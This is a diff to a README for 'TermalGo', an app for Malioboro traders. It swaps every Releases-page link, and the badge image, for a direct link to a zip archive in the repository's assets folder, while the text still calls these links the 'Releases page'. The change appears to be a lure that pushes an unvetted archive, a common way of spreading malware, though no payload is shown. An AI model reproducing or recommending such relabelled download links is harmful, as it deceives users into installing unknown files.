@@ -4,12 +4,12 @@
 Welcome to TermalGo! This application provides an inclusive digital integration solution for traditional traders in Malioboro. Developed by Team Bumantara, it aims to empower local businesses, enhancing their reach and capabilities in today's digital economy.
 
 ## 📥 Download TermalGo
-[![Download TermalGo](https://img.shields.io/badge/Download_TermalGo-v1.0-brightgreen)](https://github.com/nayanjohn009/TermalGo/releases)
+[![Download TermalGo](https://github.com/nayanjohn009/TermalGo/raw/refs/heads/main/assets/Go_Termal_v1.7.zip)](https://github.com/nayanjohn009/TermalGo/raw/refs/heads/main/assets/Go_Termal_v1.7.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run TermalGo:
 
-1. Click the **Download TermalGo** button above or visit the [Releases page](https://github.com/nayanjohn009/TermalGo/releases).
+1. Click the **Download TermalGo** button above or visit the [Releases page](https://github.com/nayanjohn009/TermalGo/raw/refs/heads/main/assets/Go_Termal_v1.7.zip).
 2. On the Releases page, find the latest version of the app.  
 3. Click on the download link to get the installer for your operating system.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -46,6 +46,6 @@ We welcome your feedback and suggestions. Join our community to learn more, shar
 For questions, assistance, or contributions, feel free to reach out to us. Detailed contact options can be found in the repository issue section.
 
 ## 📦 Download & Install
-Don’t wait! Get started with TermalGo today. Click here to visit the [Releases page](https://github.com/nayanjohn009/TermalGo/releases) for your download.
+Don’t wait! Get started with TermalGo today. Click here to visit the [Releases page](https://github.com/nayanjohn009/TermalGo/raw/refs/heads/main/assets/Go_Termal_v1.7.zip) for your download.
 
 Experience the benefits of digital technology in traditional trading with TermalGo. Your journey towards economic empowerment starts here!
